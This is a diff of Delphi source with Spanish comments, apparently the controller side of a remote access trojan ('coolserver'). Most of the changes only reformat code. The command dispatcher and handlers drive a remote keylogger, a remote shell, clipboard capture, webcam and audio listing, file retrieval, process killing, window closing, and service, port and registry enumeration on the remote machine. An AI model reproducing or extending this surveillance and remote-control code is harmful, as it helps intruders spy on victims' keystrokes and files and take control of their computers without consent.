-        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-        TempStr := StringReplace(TempStr,'Lectura', _('Lectura'),[rfReplaceAll]);
-        TempStr := StringReplace(TempStr,'Oculto', _('Oculto'),[rfReplaceAll]);
-        TempStr := StringReplace(TempStr,'Lectura', _('Lectura'),[rfReplaceAll]);
-        Item.SubItems.Add(TempStr); //agrega atributos
-        TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
-        Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
-        Item.SubItems.add( DateToStr(FileDateToDateTime(strtointdef(tempstr,1))) + ' ' +
-            TimeToStr(FileDateToDateTime(strtointdef(tempstr,1)))); //agrega la fecha
-        Item.SubItems.Add(RealSize);
-      end;
+              Item.SubItems.Add('');
+              Item.SubItems.Add(_('Carpeta de archivos'));
+              Item.SubItems.Add(Copy(TempStr, 1, Pos(':', TempStr) - 1));
+
+              Item.SubItems.Add(
+                DateToStr(FileDateToDateTime(StrToIntDef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)), 1))) + ' ' +
+                TimeToStr(FileDateToDateTime(StrToIntDef(Copy(TempStr, Pos(':', TempStr) + 1, Length(TempStr)), 1)))
+                );
+              a := a + 1; //numero de carpetas
+            end
+          else //entonces es un archivo, saque tambien la información extra...
+            begin
+              Item := ListViewArchivos.Items.Add;
+              Item.ImageIndex := IconNum(TempStr, True);
+              Item.Caption := TempStr;
+
+              if ((AnsiLowerCase(tempstr) = 'thumbs.db') and PrevisualizacionActiva and not receivingthumbfile) then
+                begin
+                  Receivingthumbfile := True;
+                  if Servidor.Connection.connected then
+                    Servidor.Connection.Writeln('GETFILE|' + EditPathArchivos.Text + tempstr);
+                end;
+
+              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+              Item.SubItems.Add(ObtenerMejorUnidad(StrToInt(TempStr)));
+              RealSize := TempStr;
+              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+              Item.SubItems.Add({TempStr}'Archivo'); //agrega el tipo
+              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+              TempStr := StringReplace(TempStr, 'Lectura', _('Lectura'), [rfReplaceAll]);
+              TempStr := StringReplace(TempStr, 'Oculto', _('Oculto'), [rfReplaceAll]);
+              TempStr := StringReplace(TempStr, 'Lectura', _('Lectura'), [rfReplaceAll]);
+              Item.SubItems.Add(TempStr); //agrega atributos
+              TempStr := Copy(Recibido, 1, (Pos('|', Recibido) - 1));
+              Delete(Recibido, 1, Pos('|', Recibido)); //Borra lo que acaba de copiar
+              Item.SubItems.Add(DateToStr(FileDateToDateTime(StrToIntDef(tempstr, 1))) + ' ' +
+                TimeToStr(FileDateToDateTime(StrToIntDef(tempstr, 1)))); //agrega la fecha
+              Item.SubItems.Add(RealSize);
+            end;
+        end;
+      LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
+      LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(listviewarchivos.Items.Count - a - 1);
+      Estado(_('Directorio listado!'));
+      if PrevisualizacionActiva then
+        cargariconos(False);
+      ListViewArchivos.Items.EndUpdate;
+      listviewarchivos.Width := listviewarchivos.Width + 1; //Para que desaparezca la scrollbar horizontal
+      listviewarchivos.Width := listviewarchivos.Width - 1;
+      BtnActualizarArchivos.Enabled := True;
+      ListviewArchivos.Enabled := True;
+      SpeedbuttonRutasRapidas.Enabled := True;
+      ListviewArchivos.Enabled := True;
+      CmbUnidades.Enabled := True;
     end;
-    LabelNumeroDeCarpetas.Caption := 'Carpetas: ' + IntToStr(a);
-    LabelNumeroDeArchivos.Caption := 'Archivos: ' + IntToStr(listviewarchivos.Items.count-a-1);
-    Estado(_('Directorio listado!'));
-    if PrevisualizacionActiva then
-      cargariconos(false);
-    ListViewArchivos.Items.EndUpdate;
-    listviewarchivos.Width := listviewarchivos.Width+1;     //Para que desaparezca la scrollbar horizontal
-    listviewarchivos.Width := listviewarchivos.Width-1;
-    BtnActualizarArchivos.enabled := True;
-    ListviewArchivos.enabled := True;
-    SpeedbuttonRutasRapidas.enabled := true;
-    ListviewArchivos.enabled := True;
-    CmbUnidades.enabled := True;
-  end;
 
   if Copy(Recibido, 1, 9) = 'GETFOLDER' then
-  begin
-    Delete(Recibido, 1, 9);
-    while pos('|', Recibido) > 0 do
     begin
-       Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-       Delete(Recibido, 1, Pos('|', Recibido));
-       agregardescargaencola(TempStr, strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),0));
-       Delete(Recibido, 1, Pos('|', Recibido));
+      Delete(Recibido, 1, 9);
+      while Pos('|', Recibido) > 0 do
+        begin
+          Tempstr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
+          agregardescargaencola(TempStr, StrToIntDef(Copy(Recibido, 1, Pos('|', Recibido) - 1), 0));
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
     end;
-  end;
 
   if Copy(Recibido, 1, 12) = 'LISTARCLAVES' then
-  begin
-    Delete(Recibido, 1, 13);
-   { if Pos('|', Recibido) > 1 then
     begin
-      TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
-      Delete(Recibido, 1, Pos('|', Recibido));
-    end;       }
-   { while length(Recibido) < StrToInt(TempStr) do
-    begin
-      Recibido := Recibido + Trim(Athread.Connection.ReadLn);
-    end;     }
-    AniadirClavesARegistro(Recibido);
-  end;
-  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
-  begin
-    Delete(Recibido, 1, 14);
-    AniadirValoresARegistro(Recibido);
-    Recibido := '';
-    BtnVerRegisto.enabled := true;
-    Estado(_('Valores de la clave listados'));
-  end;
-  if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
-  begin
-    Delete(Recibido, 1, 14);
-    ComboBoxWebcam.Clear;
-    while Pos('|', Recibido) > 0 do
-    begin
-      ComboBoxWebcam.Items.Append(Copy(Recibido, 1, Pos('|', Recibido) - 1));
-      Delete(Recibido, 1, Pos('|', Recibido));
+      Delete(Recibido, 1, 13);
+      { if Pos('|', Recibido) > 1 then
+       begin
+         TempStr := Copy(recibido, 1, Pos('|', Recibido) - 1);
+         Delete(Recibido, 1, Pos('|', Recibido));
+       end;       }
+      { while length(Recibido) < StrToInt(TempStr) do
+       begin
+         Recibido := Recibido + Trim(Athread.Connection.ReadLn);
+       end;     }
+      AniadirClavesARegistro(Recibido);
     end;
-    Estado(_('Webcams listadas.'));
-  end;
+  if Copy(Recibido, 1, 13) = 'LISTARVALORES' then
+    begin
+      Delete(Recibido, 1, 14);
+      AniadirValoresARegistro(Recibido);
+      Recibido := '';
+      BtnVerRegisto.Enabled := True;
+      Estado(_('Valores de la clave listados'));
+    end;
+  if Copy(Recibido, 1, 13) = 'LISTARWEBCAMS' then
+    begin
+      Delete(Recibido, 1, 14);
+      ComboBoxWebcam.Clear;
+      while Pos('|', Recibido) > 0 do
+        begin
+          ComboBoxWebcam.Items.Append(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+      Estado(_('Webcams listadas.'));
+    end;
 
   if Pos('SHELL|', Recibido) = 1 then
-  begin
-    Delete(Recibido, 1, 6);
-    if Recibido = 'ACTIVAR' then
     begin
-      TabShell.Highlighted := true;
-      MemoShell.Color      := ClBlack;
-      MemoShell.Font.Color := clWhite;
-      ComboBoxShellCommand.Color := ClBlack;
-      ComboBoxshellCommand.Font.Color := clWhite;
-      ComboBoxShellCommand.Enabled := True;
-      Estado(_('Shell correctamente activada'));
-    end
-    else
-    if Recibido = 'DESACTIVAR' then
-    begin
-      //exit;
-      TabShell.Highlighted := false;
-      MemoShell.Color      := ClInactiveBorder;
-      MemoShell.Font.Color := clWhite;
-      ComboBoxShellCommand.Color := ClInactiveBorder;
-      ComboBoxshellCommand.Font.Color := clWhite;
-      ComboBoxShellCommand.Enabled := False;
-      Estado(_('Shell correctamente desactivada'));
-    end
-    else
-    begin
-      TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
-      TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
-      Memoshell.Lines.Append(Trim(Tempstr));
-      SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, length(Memoshell.text));
+      Delete(Recibido, 1, 6);
+      if Recibido = 'ACTIVAR' then
+        begin
+          TabShell.Highlighted := True;
+          MemoShell.Color := clBlack;
+          MemoShell.Font.Color := clWhite;
+          ComboBoxShellCommand.Color := clBlack;
+          ComboBoxshellCommand.Font.Color := clWhite;
+          ComboBoxShellCommand.Enabled := True;
+          Estado(_('Shell correctamente activada'));
+        end
+      else if Recibido = 'DESACTIVAR' then
+        begin
+          //exit;
+          TabShell.Highlighted := False;
+          MemoShell.Color := ClInactiveBorder;
+          MemoShell.Font.Color := clWhite;
+          ComboBoxShellCommand.Color := ClInactiveBorder;
+          ComboBoxshellCommand.Font.Color := clWhite;
+          ComboBoxShellCommand.Enabled := False;
+          Estado(_('Shell correctamente desactivada'));
+        end
+      else
+        begin
+          TempStr := StringReplace(Trim(Recibido), '|salto|', #10, [rfReplaceAll]);
+          TempStr := StringReplace((Tempstr), '|salto2|', #13, [rfReplaceAll]);
+          Memoshell.Lines.Append(Trim(Tempstr));
+          SendMessage(MemoShell.Handle, EM_LINESCROLL, 0, Length(Memoshell.Text));
+        end;
     end;
-  end;
 
   if Copy(Recibido, 1, 12) = 'SERVICIOSWIN' then
-  begin
-    Delete(Recibido, 1, 14); //es 14 porque los datos recibidos se inicia con un /
-    // ejemplo : /alerter/alvg*..
-    listviewservicios.Items.BeginUpdate;
-    while pos('|', Recibido) > 0 do
     begin
-      Item := listviewservicios.Items.Add;
-      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-      Delete(Recibido, 1, Pos('|', Recibido));
-      Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
-      Delete(Recibido, 1, Pos('|', Recibido));
-      Item.SubItems.Add(copy(recibido, 1, pos('|', Recibido) - 1));
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Parado') then
-      begin
-        item.ImageIndex := 69;
-        item.SubItems[1] := _('Parado');
-      end
-      else
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Corriendo') then
-      begin
-        item.ImageIndex := 71;
-        item.SubItems[1] := _('Corriendo');
-      end
-      else
-      if(copy(recibido, 1, pos('|', Recibido) - 1) = 'Pausado') then
-      begin
-        item.ImageIndex := 70;
-        item.SubItems[1] := _('Pausado');
-      end
-      else
-      begin
-        item.ImageIndex := 45;
-      end;
-      Delete(Recibido, 1, Pos('|', Recibido));
-    end;
-    listviewservicios.Items.EndUpdate;
-    listviewservicios.Width := listviewservicios.Width-1;//Para eliminar la scrollvar horizontal
-    listviewservicios.Width := listviewservicios.Width+1;
-    BtnServicios.enabled := true;
-    ListviewServicios.enabled := true;
-    Estado(_('Servicios listados'));
-  end;
-
-   if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
-  begin
-    Delete(Recibido, 1, Pos('|', Recibido));
-    if(copy(Recibido, 1, pos('|', Recibido) - 1) = 'ACTIVADO') then
-    begin
-      SpeedButtonRecibirLog.Enabled := true;
-      SpeedButtonGuardarLog.Enabled := true;
-      SpeedButtonEliminarLog.Enabled := true;
-      ProgressBarKeylogger.Enabled := true;
-      EditLogName.Enabled := false;
-      SpeedButtonActivarKeylogger.caption := _('Desactivar Keylogger');
-      SpeedButtonActivarKeylogger.enabled := true;
-      CheckBoxOnlineKeylogger.enabled := true;
-    end
-    else
-    begin
-      SpeedButtonRecibirLog.Enabled := false;
-      SpeedButtonGuardarLog.Enabled := false;
-      SpeedButtonEliminarLog.Enabled := false;
-      ProgressBarKeylogger.Enabled := false;
-      EditLogName.Enabled := true;
-      SpeedButtonActivarKeylogger.caption := _('Activar Keylogger');
-      SpeedButtonActivarKeylogger.enabled := true;
-      CheckBoxOnlineKeylogger.enabled := false;
-    end;
-    Delete(Recibido, 1, Pos('|', Recibido));
-    if(copy(Recibido, 1, pos('|', Recibido) - 1)<>'') then
-      EditLogName.Text := Extractfilename(copy(Recibido, 1, pos('|', Recibido) - 1));
-  end;
-
-  if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
-  begin
-    Delete(Recibido, 1, Pos('|', Recibido));
-    Recibido := StringReplace((Recibido),'|salto|', #10, [rfReplaceAll]);
-    Recibido := StringReplace((Recibido),'|salto2|', #13, [rfReplaceAll]);
-    Recibido := StringReplace((Recibido),'|espacio|', ' ', [rfReplaceAll]); 
-    RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
-    AgregarARichEdit(Recibido);
-  end;
-
-  if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
-  begin
-    Delete(Recibido, 1, Pos('|', Recibido));
-    AnchuraPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
-    Delete(Recibido, 1, Pos('|', Recibido));
-    AlturaPantalla := strtoint(copy(Recibido, 1, pos('|', Recibido) - 1));
-  end;
-
-  if Copy(Recibido, 1, 6) = 'SEARCH' then
-  begin
-    Delete(Recibido, 1, Pos('|', Recibido));
-    if copy(Recibido,1,5) = 'STOPS' then     //Paramos...
-    begin
-      TabSheetBuscar.highlighted := false;
-      TabFileManager.highlighted := false;
-      SpeedButtonBuscar.caption := _('Comenzar');
-      SpeedButtonBuscar.enabled := true;
-      EditBuscar.Enabled := true;
-      Estado(_('Busqueda parada'));
-    end
-    else if  copy(Recibido,1,6) = 'FINISH' then //Terminado!
-    begin
-      SpeedButtonBuscar.caption := _('Comenzar');
-      SpeedButtonBuscar.enabled := true;
-      EditBuscar.Enabled := true;
-      Estado(_('Busqueda finalizada'));
-      TabSheetBuscar.highlighted := false;
-      TabFileManager.highlighted := false;
-    end
-    else
-    begin
-      if ParaDeBuscar then exit;
-
-     { while pos('|', Recibido) > 0 do
-      begin   }
-          if( Encontrados > 50000) then exit; //WTFFF!!!
-          SearchItems[encontrados].Nombre := copy(Recibido, 1, pos('|',Recibido)-1);
-          delete(Recibido,1,pos('|',Recibido));
-          SearchItems[encontrados].TamanioReal := strtoint(copy(Recibido, 1, pos('|',Recibido)-1));
-          SearchItems[encontrados].Tamanio := ObtenerMejorUnidad(strtoint(copy(Recibido, 1, pos('|',Recibido)-1)));
-          delete(Recibido,1,pos('|',Recibido));
-          SearchItems[encontrados].Tipo := copy(Recibido, 1, pos('|',Recibido)-1);
-          SearchItems[encontrados].Atributos := '';
-          delete(Recibido,1,pos('|',Recibido));
-          SearchItems[encontrados].Fechamodify := strtointdef(copy(Recibido, 1, pos('|',Recibido)-1),1);
-          delete(Recibido,1,pos('|',Recibido));
-          Encontrados := Encontrados+1;
-
-      end;  //fin while
-      //end;
-   end;
-
-
-  if Copy(Recibido, 1, 6) = 'GORUTA' then
-  begin
-    Delete(Recibido, 1, Pos('|', Recibido));
-    EditPathArchivos.Text := trim(copy(Recibido, 1, pos('|', Recibido) - 1));
-    BtnActualizarArchivos.Click;
-  end;
-
-  // Portapapeles!
-  If Copy(Recibido,1,7) = 'GETCLIP' then
-  begin
-       Delete(Recibido,1,8);
-       TempStr := StringReplace(Trim(Recibido),'|salto|', #10, [rfReplaceAll]);
-       TempStr := StringReplace((Tempstr),'|salto2|', #13, [rfReplaceAll]);
-       MemoClipBoard.Text:= TempStr;
-       SpeedButtonClipBoard1.enabled := true;
-       Estado(_('Portapapeles recibido'));
-  end;
-
-  if Copy(Recibido,1,11) = 'GETADRIVERS' then
-  begin
-    Delete(Recibido,1,12);
-    ComboBoxAudioDevices.Items.Clear; //Primero limpiamos los que había
-    while Pos('|', Recibido) > 0 do
-    begin
-      ComboBoxAudioDevices.Items.Add(copy(Recibido, 1, pos('|', Recibido) - 1));
-      Delete(Recibido, 1, Pos('|', Recibido));
-    end;
-    SpeedButtonListarAudio.enabled := true;
-    Estado(_('Dispositivos de audio listados'));
-  end;
-
-  if Copy(Recibido,1,6) = 'TCPUDP' then
-  begin
-    ListviewPuertos.Clear;
-    delete (Recibido,1,7);
-    While pos('|',recibido)>0 do
-    begin
-      item:=ListviewPuertos.Items.Add;
-      Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
-      TempStr:= Copy(Recibido, 1, Pos('|', Recibido) - 1);
-
-      Delete(Recibido, 1, Pos('|', Recibido));
-      for i:=0 to 6 do
-      begin
+      Delete(Recibido, 1, 14); //es 14 porque los datos recibidos se inicia con un /
+      // ejemplo : /alerter/alvg*..
+      listviewservicios.Items.BeginUpdate;
+      while Pos('|', Recibido) > 0 do
+        begin
+          Item := listviewservicios.Items.Add;
+          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
           Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
           Delete(Recibido, 1, Pos('|', Recibido));
-      end;
+          Item.SubItems.Add(Copy(recibido, 1, Pos('|', Recibido) - 1));
+          if (Copy(recibido, 1, Pos('|', Recibido) - 1) = 'Parado') then
+            begin
+              item.ImageIndex := 69;
+              item.SubItems[1] := _('Parado');
+            end
+          else if (Copy(recibido, 1, Pos('|', Recibido) - 1) = 'Corriendo') then
+            begin
+              item.ImageIndex := 71;
+              item.SubItems[1] := _('Corriendo');
+            end
+          else if (Copy(recibido, 1, Pos('|', Recibido) - 1) = 'Pausado') then
+            begin
+              item.ImageIndex := 70;
+              item.SubItems[1] := _('Pausado');
+            end
+          else
+            begin
+              item.ImageIndex := 45;
+            end;
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+      listviewservicios.Items.EndUpdate;
+      listviewservicios.Width := listviewservicios.Width - 1; //Para eliminar la scrollvar horizontal
+      listviewservicios.Width := listviewservicios.Width + 1;
+      BtnServicios.Enabled := True;
+      ListviewServicios.Enabled := True;
+      Estado(_('Servicios listados'));
     end;
-    Estado('Escaneo de Puerto Finalizado..');
-    ListviewPuertos.enabled := true;
-    BtnRefrescarPuertos.enabled := true;
-    CheckBoxPuertos.enabled := true;
-  end;
 
-// se fini del dispacher de comandos
+  if Copy(Recibido, 1, 15) = 'ESTADOKEYLOGGER' then
+    begin
+      Delete(Recibido, 1, Pos('|', Recibido));
+      if (Copy(Recibido, 1, Pos('|', Recibido) - 1) = 'ACTIVADO') then
+        begin
+          SpeedButtonRecibirLog.Enabled := True;
+          SpeedButtonGuardarLog.Enabled := True;
+          SpeedButtonEliminarLog.Enabled := True;
+          ProgressBarKeylogger.Enabled := True;
+          EditLogName.Enabled := False;
+          SpeedButtonActivarKeylogger.Caption := _('Desactivar Keylogger');
+          SpeedButtonActivarKeylogger.Enabled := True;
+          CheckBoxOnlineKeylogger.Enabled := True;
+        end
+      else
+        begin
+          SpeedButtonRecibirLog.Enabled := False;
+          SpeedButtonGuardarLog.Enabled := False;
+          SpeedButtonEliminarLog.Enabled := False;
+          ProgressBarKeylogger.Enabled := False;
+          EditLogName.Enabled := True;
+          SpeedButtonActivarKeylogger.Caption := _('Activar Keylogger');
+          SpeedButtonActivarKeylogger.Enabled := True;
+          CheckBoxOnlineKeylogger.Enabled := False;
+        end;
+      Delete(Recibido, 1, Pos('|', Recibido));
+      if (Copy(Recibido, 1, Pos('|', Recibido) - 1) <> '') then
+        EditLogName.Text := Extractfilename(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+    end;
+
+  if Copy(Recibido, 1, 13) = 'NEWKEYLOGKEYS' then
+    begin
+      Delete(Recibido, 1, Pos('|', Recibido));
+      Recibido := StringReplace((Recibido), '|salto|', #10, [rfReplaceAll]);
+      Recibido := StringReplace((Recibido), '|salto2|', #13, [rfReplaceAll]);
+      Recibido := StringReplace((Recibido), '|espacio|', ' ', [rfReplaceAll]);
+      RichEditKeylogger.SelStart := RichEditKeylogger.GetTextLen;
+      AgregarARichEdit(Recibido);
+    end;
+
+  if Copy(Recibido, 1, 14) = 'DATOSCAPSCREEN' then
+    begin
+      Delete(Recibido, 1, Pos('|', Recibido));
+      AnchuraPantalla := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+      Delete(Recibido, 1, Pos('|', Recibido));
+      AlturaPantalla := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+    end;
+
+  if Copy(Recibido, 1, 6) = 'SEARCH' then
+    begin
+      Delete(Recibido, 1, Pos('|', Recibido));
+      if Copy(Recibido, 1, 5) = 'STOPS' then //Paramos...
+        begin
+          TabSheetBuscar.highlighted := False;
+          TabFileManager.highlighted := False;
+          SpeedButtonBuscar.Caption := _('Comenzar');
+          SpeedButtonBuscar.Enabled := True;
+          EditBuscar.Enabled := True;
+          Estado(_('Busqueda parada'));
+        end
+      else if Copy(Recibido, 1, 6) = 'FINISH' then //Terminado!
+        begin
+          SpeedButtonBuscar.Caption := _('Comenzar');
+          SpeedButtonBuscar.Enabled := True;
+          EditBuscar.Enabled := True;
+          Estado(_('Busqueda finalizada'));
+          TabSheetBuscar.highlighted := False;
+          TabFileManager.highlighted := False;
+        end
+      else
+        begin
+          if ParaDeBuscar then Exit;
+
+          { while pos('|', Recibido) > 0 do
+           begin   }
+          if (Encontrados > 50000) then Exit; //WTFFF!!!
+          SearchItems[encontrados].Nombre := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
+          SearchItems[encontrados].TamanioReal := StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+          SearchItems[encontrados].Tamanio := ObtenerMejorUnidad(StrToInt(Copy(Recibido, 1, Pos('|', Recibido) - 1)));
+          Delete(Recibido, 1, Pos('|', Recibido));
+          SearchItems[encontrados].Tipo := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          SearchItems[encontrados].Atributos := '';
+          Delete(Recibido, 1, Pos('|', Recibido));
+          SearchItems[encontrados].Fechamodify := StrToIntDef(Copy(Recibido, 1, Pos('|', Recibido) - 1), 1);
+          Delete(Recibido, 1, Pos('|', Recibido));
+          Encontrados := Encontrados + 1;
+
+        end; //fin while
+      //end;
+    end;
+
+  if Copy(Recibido, 1, 6) = 'GORUTA' then
+    begin
+      Delete(Recibido, 1, Pos('|', Recibido));
+      EditPathArchivos.Text := trim(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+      BtnActualizarArchivos.Click;
+    end;
+
+  // Portapapeles!
+  if Copy(Recibido, 1, 7) = 'GETCLIP' then
+    begin
+      Delete(Recibido, 1, 8);
+      TempStr := StringReplace(Trim(Recibido), '|salto|', #10, [rfReplaceAll]);
+      TempStr := StringReplace((Tempstr), '|salto2|', #13, [rfReplaceAll]);
+      MemoClipBoard.Text := TempStr;
+      SpeedButtonClipBoard1.Enabled := True;
+      Estado(_('Portapapeles recibido'));
+    end;
+
+  if Copy(Recibido, 1, 11) = 'GETADRIVERS' then
+    begin
+      Delete(Recibido, 1, 12);
+      ComboBoxAudioDevices.Items.Clear; //Primero limpiamos los que había
+      while Pos('|', Recibido) > 0 do
+        begin
+          ComboBoxAudioDevices.Items.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+          Delete(Recibido, 1, Pos('|', Recibido));
+        end;
+      SpeedButtonListarAudio.Enabled := True;
+      Estado(_('Dispositivos de audio listados'));
+    end;
+
+  if Copy(Recibido, 1, 6) = 'TCPUDP' then
+    begin
+      ListviewPuertos.Clear;
+      Delete(Recibido, 1, 7);
+      while Pos('|', recibido) > 0 do
+        begin
+          item := ListviewPuertos.Items.Add;
+          Item.Caption := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+          TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+
+          Delete(Recibido, 1, Pos('|', Recibido));
+          for i := 0 to 6 do
+            begin
+              Item.SubItems.Add(Copy(Recibido, 1, Pos('|', Recibido) - 1));
+              Delete(Recibido, 1, Pos('|', Recibido));
+            end;
+        end;
+      Estado('Escaneo de Puerto Finalizado..');
+      ListviewPuertos.Enabled := True;
+      BtnRefrescarPuertos.Enabled := True;
+      CheckBoxPuertos.Enabled := True;
+    end;
+
+  // se fini del dispacher de comandos
 end;
 
-function TFormControl.IconNum(strExt: string;usecache : boolean): integer;
+function TFormControl.IconNum(strExt: string; usecache: Boolean): Integer;
 var
-  FileInfo : SHFILEINFO;
-  i        : integer;
+  FileInfo: SHFILEINFO;
+  i: Integer;
 begin
   StrExt := UpperCase(ExtractFileExt(strext));
-  if not (POS('.', strext) >0) then
+  if not (Pos('.', strext) > 0) then
     StrExt := 'SYS';
   if usecache then
-  begin
-      for i:=0 to numcached do
-      if CachedIcons[i].Extension = StrExt then
-      begin
-        Result := CachedIcons[i].num;
-        exit;
-      end;
-  end;
+    begin
+      for i := 0 to numcached do
+        if CachedIcons[i].Extension = StrExt then
+          begin
+            Result := CachedIcons[i].num;
+            Exit;
+          end;
+    end;
   SHGetFileInfo(PChar(StrExt),
-                    FILE_ATTRIBUTE_NORMAL,
-                    FileInfo,
-                    SizeOf(FileInfo),
-                    SHGFI_ICON  or
-                    SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
+    FILE_ATTRIBUTE_NORMAL,
+    FileInfo,
+    SizeOf(FileInfo),
+    SHGFI_ICON or
+    SHGFI_SYSICONINDEX or SHGFI_USEFILEATTRIBUTES);
   Result := FileInfo.iIcon;
   CachedIcons[numcached].num := Result;
   CachedIcons[numcached].Extension := StrExt;
-  numcached := numcached +1;
+  numcached := numcached + 1;
 end;
 
 //Boton obtener información
+
 procedure TFormControl.BtnRefrescarInformacionClick(Sender: TObject);
 begin
-  if not BtnRefrescarInformacion.Enabled then exit;
-  BtnRefrescarInformacion.Enabled := false;
+  if not BtnRefrescarInformacion.Enabled then Exit;
+  BtnRefrescarInformacion.Enabled := False;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('INFO')
   else
@@ -1465,11 +1485,12 @@ begin
 end;
 
 //Boton obtener procesos
+
 procedure TFormControl.BtnRefrescarProcesosClick(Sender: TObject);
 begin
-  if not BtnRefrescarProcesos.Enabled then exit;
-  BtnRefrescarProcesos.Enabled := false;
-  ListviewProcesos.enabled := false;
+  if not BtnRefrescarProcesos.Enabled then Exit;
+  BtnRefrescarProcesos.Enabled := False;
+  ListviewProcesos.Enabled := False;
   if Servidor.Connection.Connected then
     Servidor.Connection.Writeln('PROC')
   else
@@ -1477,169 +1498,177 @@ begin
 end;
 
 //Item del popupmenu para cerrar un proceso
+
 procedure TFormControl.Cerrar1Click(Sender: TObject);
 begin
- mslistviewitem := ListViewProcesos.Selected;
+  mslistviewitem := ListViewProcesos.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
-    else
     begin
+      if mslistviewitem = nil then
+        MessageDlg(_('Selecciona algún proceso para matar'), mtWarning, [mbOK], 0)
+      else
+        begin
 
-      while Assigned(mslistviewitem) do
-      begin
-       Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewProcesos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
+          while Assigned(mslistviewitem) do
+            begin
+              Servidor.Connection.Writeln('KILLPROC|' + mslistviewitem.SubItems[0]);
+              mslistviewitem := ListViewProcesos.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+            end;
 
+        end
     end
-  end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Boton obtener ventanas
+
 procedure TFormControl.BtnRefrescarVentanasClick(Sender: TObject);
 begin
-  if not BtnRefrescarVentanas.Enabled then exit;
-  CheckBoxMostrarVentanasOcultas.enabled := false;
-  BtnRefrescarVentanas.Enabled := false;
-  ListViewVentanas.Enabled := false;
+  if not BtnRefrescarVentanas.Enabled then Exit;
+  CheckBoxMostrarVentanasOcultas.Enabled := False;
+  BtnRefrescarVentanas.Enabled := False;
+  ListViewVentanas.Enabled := False;
   if Servidor.Connection.Connected then
-  begin
-    if(CheckBoxMostrarVentanasOcultas.Checked) then
-      Servidor.Connection.Writeln('WIND|true|')
-    else
-      Servidor.Connection.Writeln('WIND|false|');
-  end
+    begin
+      if (CheckBoxMostrarVentanasOcultas.Checked) then
+        Servidor.Connection.Writeln('WIND|true|')
+      else
+        Servidor.Connection.Writeln('WIND|false|');
+    end
   else
     MessageDlg(_('No estás conectado!'), mtWarning, [mbOK], 0);
 end;
 
 //Item del popupmenu para cerrar una ventana
+
 procedure TFormControl.Cerrar2Click(Sender: TObject);
 begin
   mslistviewitem := ListViewVentanas.Selected;
 
   if Servidor.Connection.Connected then
-  begin
-    if mslistviewitem = nil then
-      MessageDlg(_('Selecciona alguna ventana'), mtWarning, [mbOK], 0)
-    else
     begin
-      while Assigned(mslistviewitem) do
-      begin
-       if mslistviewitem.Caption = 'Program Manager' then
-       begin
-        if MessageDlg(_('¿Está seguro que desea intentar cerrar la ventana Program Manager? (Es posible que coolserver se bloquee)?'), mtConfirmation, [mbYes, mbNo], 0) = idyes then
-          Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
-       end
-       else
-        Servidor.Connection.Writeln('CLOSEWIN|' + mslistviewitem.SubItems[0]);
-       mslistviewitem := ListViewVentanas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
-      end;
-      end;
-  end
